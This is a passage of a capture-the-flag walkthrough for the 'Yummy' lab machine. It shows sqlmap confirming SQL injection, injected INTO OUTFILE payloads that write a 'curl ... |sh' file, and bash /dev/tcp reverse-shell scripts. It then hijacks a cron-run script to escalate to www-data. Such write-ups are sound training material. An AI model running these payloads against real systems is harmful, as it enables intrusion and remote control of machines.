With a click on the `SEARCH button` the `URL` changed to something what looked like a `SQL Query`.

```c
http://yummy.htb/admindashboard?s=&o=ASC
```

We entered some `'` and `;` to get the following `SQL Error Message` which was a nice indicator for a potential `SQL Injection (SQLi)` vulnerability.

![](images/2024-10-06_17-10_80_admindashboard_sqli.png)

With `Intercept` on we refreshed the page to `save the request` and moved over to `sqlmap` to verify if there is anything to the `*` we added and if it would be worth digging deeper into it.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/files]
└─$ cat request.req 
GET /admindashboard?s=&o=ASC* HTTP/1.1
Host: yummy.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzI4MjI2OTM1LCJleHAiOjE3MjgyMzA1MzUsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTE5NjUzNjUzMTk5OTU1NDA4Mzk4MzgyNTQzMTU5ODAwMDY5ODIwMDY0MzY4MDQzOTIzOTQwOTE0MTU3MTUxNjcwNzc0ODc2Njc5MjYyNDY5Mjg3MDk1OTcxOTAzODc0ODI2NDEzOTE1NDYyMjk2MzA1Nzg5NjIxMTE0MjIwOTQxMTA0Nzg3NjQ3ODE5OTcwODc5ODA1NzQxMzg4MzczMzMxODAxNDA0NDc4MzU3ODA3NzYzNzEzNTQ2NjUxOTcxNjg3MTE5NjE1Mjc5MTczNjY2NTgxMzQ4MDk1MzgyODUxNzg4MTAzNzAxNTY0MDM0OTIwNTgzNTEzODc3MjgxMTU2NTc3MTQ3NDkyMzQ5MTMwNDAzMjQ0MDkyNzAzOTk3NDE0NDg3OTc4NjQyMTUzMjg4NDY3MjgyMjU5IiwiZSI6NjU1Mzd9fQ.CecALElkwNezfehzz6x_AvNo-mzwLbtBOk2Auo92SWV8yk55J5TJwxfXVmlb5vlBCxTN4fkVUjz13nH-VcbEukvRZJojs5xcZbnWRcri8SUSEpO8T8M1VBOOU-VxTJpv9T2OgGXbOIadX3QMsJKhEAHwKxLK5nomi6dImNXT4Mk_MOI
Connection: keep-alive


```

And indeed `sqlmap` confirmed a potential `SQL Injection (SQLi)` after the `ASC`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/files]
└─$ sqlmap -r request.req --batch
        ___
       __H__                                                                     
 ___ ___[(]_____ ___ ___  {1.8.9#stable}                                         
|_ -| . [.]     | .'| . |                                                        
|___|_  [.]_|_|_|__,|  _|                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:19:47 /2024-10-06/

[17:19:47] [INFO] parsing HTTP request from 'request.req'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
Cookie parameter 'X-AUTH-Token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[17:19:47] [INFO] testing connection to the target URL
[17:19:50] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:19:50] [INFO] testing if the target URL content is stable
[17:19:50] [INFO] target URL content is stable
[17:19:50] [INFO] testing if URI parameter '#1*' is dynamic
[17:19:50] [WARNING] URI parameter '#1*' does not appear to be dynamic
[17:19:51] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[17:19:51] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:19:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:19:52] [WARNING] reflective value(s) found and filtering out
[17:19:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:19:53] [INFO] testing 'Generic inline queries'
[17:19:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:19:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:20:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[17:20:04] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[17:20:11] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[17:20:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[17:20:25] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[17:20:33] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[17:20:40] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:20:47] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:20:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[17:20:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[17:20:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[17:20:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[17:20:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[17:20:55] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[17:20:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[17:20:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[17:20:56] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[17:20:56] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[17:20:56] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[17:21:01] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[17:21:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:21:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[17:21:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:21:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[17:21:21] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[17:21:25] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[17:21:30] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[17:21:35] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[17:21:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:21:47] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:21:52] [INFO] testing 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:21:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:21:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:22:02] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:22:07] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:22:12] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:22:17] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[17:22:22] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[17:22:25] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:22:28] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[17:22:28] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[17:22:28] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[17:22:28] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[17:22:29] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:22:29] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[17:22:29] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[17:22:29] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[17:22:29] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[17:22:29] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[17:22:29] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[17:22:30] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[17:22:30] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[17:22:30] [INFO] URI parameter '#1*' is 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' injectable 
[17:22:30] [INFO] testing 'MySQL inline queries'
[17:22:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[17:22:40] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[17:22:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:22:40] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[17:22:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[17:22:40] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[17:22:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[17:22:41] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[17:22:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[17:22:41] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[17:22:41] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[17:22:41] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[17:22:41] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[17:22:41] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[17:22:41] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[17:22:41] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[17:22:41] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[17:22:41] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[17:22:41] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[17:22:41] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[17:22:41] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[17:22:41] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[17:22:41] [INFO] testing 'MySQL AND time-based blind (ELT)'
[17:22:41] [INFO] testing 'MySQL OR time-based blind (ELT)'
[17:22:41] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[17:22:41] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[17:22:42] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:22:42] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:22:42] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[17:22:42] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[17:22:42] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[17:22:42] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[17:22:42] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[17:22:42] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[17:22:42] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[17:22:42] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
got a 302 redirect to 'http://yummy.htb/login'. Do you want to follow? [Y/n] Y
[17:23:14] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
[17:23:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:23:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:23:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:23:17] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[17:23:18] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[17:23:20] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[17:23:21] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[17:23:23] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[17:23:25] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[17:23:26] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[17:23:28] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[17:23:29] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[17:23:31] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1928 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: error-based
    Title: MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)
    Payload: http://yummy.htb/admindashboard?s=&o=ASC,EXTRACTVALUE(1354,CONCAT(0x5c,0x71786a7a71,(SELECT (ELT(1354=1354,1))),0x716b627171))

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: http://yummy.htb/admindashboard?s=&o=ASC;SELECT SLEEP(5)#
---
[17:23:31] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[17:23:33] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/yummy.htb'

[*] ending @ 17:23:33 /2024-10-06/
```

## Foothold

Since we were not able to `dump` anything out of the `database` we looked closer to the `dbmonitor.sh` script from before.

```c
<--- CUT FOR BREVITY --->
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
<--- CUT FOR BREVITY --->
```

The script ran `external commands` such as `/bin/bash "$latest_version"` and `/usr/bin/ls -1 /data/scripts/fixer-v_` based on the `value` of `latest_version` and the `contents` of the `/data/scripts/` directory. 

The idea was to place a `malicious file` in `/data/scripts/` to get executed after overwriting the `dbstatus.json` as trigger. We assumed that if `fixer-v-malicious` exists it will be picked up by the `/usr/bin/ls -1 /data/scripts/fixer-v_` command and got executed.

The documentation on how `SELECT` can be used in combination with `INTO OUTFILE` helped a lot.

- [https://mariadb.com/kb/en/select-into-outfile/](https://mariadb.com/kb/en/select-into-outfile/)

We prepared the `payload` which should get `picked up` by the `application`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/serve]
└─$ cat x
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.112/9001 0>&1'
```

Then we prepared `two payloads`. The `first` one to write `anything random` inside `dbstatus.json` to trigger our `malicious file`.

```c
http://yummy.htb/admindashboard?s=aa&o=ASC%3b++SELECT+"foobar%3b"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b
```

And with the `second` one we wrote the actual `malicious fixer-v` file in the `/data/scripts` directory.

```c
http://yummy.htb/admindashboard?s=aa&o=ASC%3b++SELECT+"curl+10.10.14.112/x+|sh%3b"+INTO+OUTFILE++'/data/scripts/fixer-vfoobar'+%3b
```

When we repeated the `second step` we actually confirmed that the file was already written.

![](images/2024-10-06_18-02_80_admindashboard_sqli_file_write.png)

After a little bit of waiting we received the `callback` and got a `reverse shell` as `mysql`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.175.114 - - [06/Oct/2024 18:02:00] "GET /x HTTP/1.1" 200 -
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.112] from (UNKNOWN) [10.129.175.114] 50618
bash: cannot set terminal process group (44734): Inappropriate ioctl for device
bash: no job control in this shell
mysql@yummy:/var/spool/cron$
```

```c
ysql@yummy:/var/spool/cron$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
mysql@yummy:/var/spool/cron$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

mysql@yummy:/var/spool/cron$ 
mysql@yummy:/var/spool/cron$ export XTERM=xterm
mysql@yummy:/var/spool/cron$
```

## Enumeration

Since `mysql` was a `low-privileged` user and the directory `/var/spool/cron` didn't contained anything useful, we started with some basic enumeration.

```c
mysql@yummy:/var/spool/cron$ id
uid=110(mysql) gid=110(mysql) groups=110(mysql)
```

Inside `/` we found a very unusual `data` folder.

```c
mysql@yummy:/var/spool/cron$ ls -la /
total 100
drwxr-xr-x  24 root root  4096 Sep 30 08:16 .
drwxr-xr-x  24 root root  4096 Sep 30 08:16 ..
lrwxrwxrwx   1 root root     7 Apr 22 13:08 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Sep 30 08:16 bin.usr-is-merged
drwxr-xr-x   4 root root  4096 Sep 30 06:49 boot
dr-xr-xr-x   2 root root  4096 Apr 23 12:45 cdrom
drwxr-xr-x   3 root root  4096 Sep 30 08:16 data
drwxr-xr-x  20 root root  4040 Oct  5 19:01 dev
drwxr-xr-x 120 root root 12288 Sep 30 09:02 etc
drwxr-xr-x   4 root root  4096 May 27 06:08 home
lrwxrwxrwx   1 root root     7 Apr 22 13:08 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 22 13:08 lib64 -> usr/lib64
drwxr-xr-x   2 root root  4096 Sep 30 08:16 lib.usr-is-merged
drwx------   2 root root 16384 May 15 12:59 lost+found
drwxr-xr-x   2 root root  4096 Sep 30 08:16 media
drwxr-xr-x   2 root root  4096 Apr 23 09:37 mnt
drwxr-xr-x   3 root root  4096 Sep 30 08:16 opt
dr-xr-xr-x 309 root root     0 Oct  5 19:01 proc
drwx------   6 root root  4096 Oct  5 19:02 root
drwxr-xr-x  29 root root   880 Oct  6 04:32 run
lrwxrwxrwx   1 root root     8 Apr 22 13:08 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Apr  3  2024 sbin.usr-is-merged
drwxr-xr-x   2 root root  4096 May 15 13:06 snap
drwxr-xr-x   2 root root  4096 Apr 23 09:37 srv
dr-xr-xr-x  13 root root     0 Oct  5 19:01 sys
drwxrwxrwt  15 root root  4096 Oct  6 16:01 tmp
drwxr-xr-x  12 root root  4096 Apr 23 09:37 usr
drwxr-xr-x  14 root root  4096 May 27 16:17 var
```

It contained a lot file which were `owned` by `root` but we had `drwxrwxrwx` permissions on the `/data/scripts/` directory which meant we could `rename` any file inside it.

```c
mysql@yummy:/data/scripts$ ls -la
total 32
drwxrwxrwx 2 root root 4096 Oct  6 16:05 .
drwxr-xr-x 3 root root 4096 Sep 30 08:16 ..
-rw-r--r-- 1 root root   90 Sep 26 15:31 app_backup.sh
-rw-r--r-- 1 root root 1336 Sep 26 15:31 dbmonitor.sh
-rw-r----- 1 root root   60 Oct  6 16:05 fixer-v1.0.1.sh
-rw-r--r-- 1 root root 5570 Sep 26 15:31 sqlappointments.sql
-rw-r--r-- 1 root root  114 Sep 26 15:31 table_cleanup.sh
```

## Privilege Escalation to www-data

We prepared a malicious `app_backup.sh` locally just for convenience reasons and then renamed the original `app_backup.sh` on the box to replace it with our `malicious` one.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/serve]
└─$ cat app_backup.sh 
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.112/9002 0>&1'
```

```c
mysql@yummy:/data/scripts$ mv app_backup.sh app_backup.sh.bak
```

```c
mysql@yummy:/data/scripts$ wget http://10.10.14.112/app_backup.sh
--2024-10-06 16:13:54--  http://10.10.14.112/app_backup.sh
Connecting to 10.10.14.112:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 70 [text/x-sh]
Saving to: ‘app_backup.sh’

app_backup.sh       100%[===================>]      70  --.-KB/s    in 0s      

2024-10-06 16:13:54 (6.76 MB/s) - ‘app_backup.sh’ saved [70/70]
```

We made it `executable` and after a few seconds we received a `callback` as `www-data`.

```c
mysql@yummy:/data/scripts$ chmod +x app_backup.sh
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.14.112] from (UNKNOWN) [10.129.175.114] 55576
bash: cannot set terminal process group (45215): Inappropriate ioctl for device
bash: no job control in this shell
www-data@yummy:/root$
```

```c
www-data@yummy:/root$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@yummy:/root$ ^Z
zsh: suspended  nc -lnvp 9002
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9002

www-data@yummy:/root$ 
www-data@yummy:/root$ export XTERM=xterm
www-data@yummy:/root$
```

## Pivoting (www-data)

Since our landing directory was `/root` on which we had no permissions, we switched to the `home folder` of `www-data` and starting `pivoting`.

```c
www-data@yummy:/root$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

There was a `app-qatesting` folder which contained a `.hg` folder.

```c
www-data@yummy:~$ cd ~
www-data@yummy:~$ pwd   
/var/www
www-data@yummy:~$ ls -la
total 6664
drwxr-xr-x  3 www-data www-data    4096 Oct  6 16:17 .
drwxr-xr-x 14 root     root        4096 May 27 16:17 ..
drwxrwx---  7 www-data qa          4096 May 28 14:41 app-qatesting
-rw-rw-r--  1 www-data www-data 6807760 Oct  6 16:17 backupapp.zip
lrwxrwxrwx  1 root     root           9 May 27 06:17 .bash_history -> /dev/null
```

```c
www-data@yummy:~/app-qatesting$ ls -la
total 40
drwxrwx--- 7 www-data qa        4096 May 28 14:41 .
drwxr-xr-x 3 www-data www-data  4096 Oct  6 16:18 ..
-rw-rw-r-- 1 qa       qa       10852 May 28 14:37 app.py
drwxr-xr-x 3 qa       qa        4096 May 28 14:26 config
drwxrwxr-x 6 qa       qa        4096 May 28 14:37 .hg
drwxr-xr-x 3 qa       qa        4096 May 28 14:26 middleware
drwxr-xr-x 6 qa       qa        4096 May 28 14:26 static
drwxr-xr-x 2 qa       qa        4096 May 28 14:26 templates
```

```c
www-data@yummy:~/app-qatesting/.hg$ ls -la
total 64
drwxrwxr-x 6 qa       qa 4096 May 28 14:37 .
drwxrwx--- 7 www-data qa 4096 May 28 14:41 ..
-rw-rw-r-- 1 qa       qa   57 May 28 14:26 00changelog.i
-rw-rw-r-- 1 qa       qa    0 May 28 14:28 bookmarks
-rw-rw-r-- 1 qa       qa    8 May 28 14:26 branch
drwxrwxr-x 2 qa       qa 4096 May 28 14:37 cache
-rw-rw-r-- 1 qa       qa 7102 May 28 14:37 dirstate
-rw-rw-r-- 1 qa       qa   34 May 28 14:37 last-message.txt
-rw-rw-r-- 1 qa       qa   11 May 28 14:26 requires
drwxrwxr-x 4 qa       qa 4096 May 28 14:37 store
drwxrwxr-x 2 qa       qa 4096 May 28 14:28 strip-backup
-rw-rw-r-- 1 qa       qa    8 May 28 14:26 undo.backup.branch.bck
-rw-rw-r-- 1 qa       qa 7102 May 28 14:34 undo.backup.dirstate.bck
-rw-rw-r-- 1 qa       qa    9 May 28 14:37 undo.desc
drwxrwxr-x 2 qa       qa 4096 May 28 14:37 wcache
```

## Privilege Escalation to qa

The `.hg` folder was a indicator for `Mercurial` which is something similar to `Git`.

- [https://wiki.mercurial-scm.org/Branch](https://wiki.mercurial-scm.org/Branch)

We checked all available files inside the `.hg` folder and found a `app.py.i` on which we executed `strings` to find some `credentials`.

```c
www-data@yummy:~/app-qatesting/.hg$ find .
.
./strip-backup
./strip-backup/c00da704e2f0-fcd95763-amend.hg
./00changelog.i
./wcache
./wcache/checklink-target
./wcache/checknoexec
./wcache/manifestfulltextcache
./wcache/checklink
./wcache/checkisexec
./cache
./cache/rbc-revs-v1
./cache/tags2-visible
./cache/rbc-names-v1
./cache/branch2-served
./last-message.txt
./requires
./undo.backup.dirstate.bck
./dirstate
./bookmarks
./store
./store/00changelog.i
./store/phaseroots
./store/data
./store/data/middleware
./store/data/middleware/____pycache____
./store/data/middleware/____pycache____/verification.cpython-312.pyc.i
./store/data/middleware/____pycache____/verification.cpython-311.pyc.i
./store/data/middleware/verification.py.i
./store/data/config
./store/data/config/____pycache____
./store/data/config/____pycache____/signature.cpython-311.pyc.i
./store/data/config/____pycache____/signature.cpython-312.pyc.i
./store/data/config/signature.py.i
./store/data/templates
./store/data/templates/login.html.i
./store/data/templates/admindashboard.html.i
./store/data/templates/register.html.i
./store/data/templates/dashboard.html.i
./store/data/templates/index.html.i
./store/data/app.py.i
./store/data/static
./store/data/static/img
./store/data/static/img/specials-1.png.i
./store/data/static/img/hero-bg.jpg.i
./store/data/static/img/about.jpg.i
./store/data/static/img/specials-3.png.d
./store/data/static/img/specials-4.png.i
./store/data/static/img/specials-1.png.d
./store/data/static/img/specials-2.png.i
./store/data/static/img/favicon.png.i
./store/data/static/img/event-custom.jpg.i
./store/data/static/img/specials-2.png.d
./store/data/static/img/apple-touch-icon.png.i
./store/data/static/img/specials-5.png.d
./store/data/static/img/event-private.jpg.i
./store/data/static/img/testimonials
./store/data/static/img/testimonials/testimonials-3.jpg.i
./store/data/static/img/testimonials/testimonials-1.jpg.i
./store/data/static/img/testimonials/testimonials-5.jpg.i
./store/data/static/img/testimonials/testimonials-2.jpg.i
./store/data/static/img/testimonials/testimonials-4.jpg.i
./store/data/static/img/menu
./store/data/static/img/menu/lobster-bisque.jpg.i
./store/data/static/img/menu/mozzarella.jpg.i
./store/data/static/img/menu/caesar.jpg.i
./store/data/static/img/menu/lobster-roll.jpg.i
./store/data/static/img/menu/bread-barrel.jpg.i
./store/data/static/img/menu/spinach-salad.jpg.i
./store/data/static/img/menu/cake.jpg.i
./store/data/static/img/menu/greek-salad.jpg.i
./store/data/static/img/menu/tuscan-grilled.jpg.i
./store/data/static/img/about-bg.jpg.d
./store/data/static/img/events-bg.jpg.d
./store/data/static/img/specials-5.png.i
./store/data/static/img/about.jpg.d
./store/data/static/img/event-birthday.jpg.d
./store/data/static/img/specials-4.png.d
./store/data/static/img/about-bg.jpg.i
./store/data/static/img/specials-3.png.i
./store/data/static/img/chefs
./store/data/static/img/chefs/chefs-1.jpg.i
./store/data/static/img/chefs/chefs-3.jpg.i
./store/data/static/img/chefs/chefs-2.jpg.i
./store/data/static/img/event-private.jpg.d
./store/data/static/img/gallery
./store/data/static/img/gallery/gallery-2.jpg.i
./store/data/static/img/gallery/gallery-4.jpg.d
./store/data/static/img/gallery/gallery-4.jpg.i
./store/data/static/img/gallery/gallery-7.jpg.d
./store/data/static/img/gallery/gallery-6.jpg.i
./store/data/static/img/gallery/gallery-7.jpg.i
./store/data/static/img/gallery/gallery-6.jpg.d
./store/data/static/img/gallery/gallery-5.jpg.d
./store/data/static/img/gallery/gallery-8.jpg.i
./store/data/static/img/gallery/gallery-5.jpg.i
